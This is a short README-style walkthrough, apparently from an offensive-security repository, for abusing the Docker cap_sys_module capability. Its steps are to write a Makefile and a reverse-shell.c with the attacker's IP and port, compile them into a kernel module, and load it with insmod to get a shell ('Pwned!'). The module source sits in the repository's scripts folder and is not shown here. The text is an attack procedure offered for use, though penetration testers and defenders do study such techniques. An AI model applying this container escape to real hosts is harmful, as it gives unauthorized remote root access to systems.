# cap_sys_module privilege

### In a docker environment, we may find a privilege named cap_sys_module. Here are the steps to exploit it:

### On the target machine:

#### 1) Create a Makefile

    nano Makefile

List modules within the container to be safe, then copy the module name in the Makefile before running make. (Do not forget to use TAB instead of 8 spaces.)

    ls -la /lib/modules

#### 2) Create a reverse-shell.c (Edit your IP and port accordingly)

    nano reverse-shell.c

#### 3) Compile

    make

#### 4) Pwned!

    insmod reverse-shell.ko 

### Scripts are added in this repository under the scripts folder
